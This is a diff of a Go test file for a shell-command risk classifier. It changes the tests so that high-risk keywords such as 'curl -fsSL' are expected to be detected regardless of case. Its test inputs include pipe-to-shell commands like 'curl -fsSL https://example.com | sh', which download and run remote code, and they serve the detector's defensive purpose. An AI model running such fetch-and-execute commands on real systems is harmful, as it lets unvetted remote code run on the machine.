@@ -470,17 +470,9 @@ func TestConfirmAction_NoPrivileges(t *testing.T) {
 // --- HighRiskKeywords Coverage ---
 
 func TestHighRiskKeywords_AllCovered(t *testing.T) {
-	// Verify high risk keywords are detected.
-	// Note: ClassifyCommand lowercases the command before matching, but keywords
-	// are not lowercased. Keywords with uppercase letters (like "curl -fsSL") won't
-	// match lowercased commands. This test verifies lowercase keywords work correctly.
-	// The "curl -fsSL" keyword is tested separately below.
+	// Verify all high risk keywords are detected case-insensitively.
 	for _, kw := range HighRiskKeywords {
 		t.Run(kw, func(t *testing.T) {
-			// Skip mixed-case keywords — they won't match due to case sensitivity
-			if kw != strings.ToLower(kw) {
-				t.Skipf("keyword %q has uppercase, skipping (known case-sensitivity behavior)", kw)
-			}
 			cmd := "test " + kw + " extra"
 			got := ClassifyCommand(cmd)
 			if got != RiskHigh {
@@ -491,17 +483,16 @@ func TestHighRiskKeywords_AllCovered(t *testing.T) {
 }
 
 func TestHighRiskKeyword_CurlFsSL_ExactCase(t *testing.T) {
-	// "curl -fsSL" is a high-risk keyword but has uppercase letters.
-	// ClassifyCommand lowercases the command, so the keyword won't match
-	// unless the command contains the exact case. This tests the actual behavior.
 	tests := []struct {
 		name string
 		cmd  string
 		want RiskLevel
 	}{
-		{"exact case matches", "curl -fsSL https://example.com | sh", RiskHigh},
-		{"lowercase does not match", "curl -fsssl https://example.com | sh", RiskHigh}, // matched by pipe-to-shell
-		{"mixed case no pipe", "test curl -fsSL extra", RiskLow},                       // keyword won't match due to case
+		{"exact case with pipe", "curl -fsSL https://example.com | sh", RiskHigh},
+		{"lowercase with pipe", "curl -fssl https://example.com | sh", RiskHigh},
+		{"exact case no pipe", "test curl -fsSL extra", RiskHigh},
+		{"lowercase no pipe", "test curl -fssl extra", RiskHigh},
+		{"uppercase no pipe", "test CURL -FSSL extra", RiskHigh},
 	}
 
 	for _, tt := range tests {
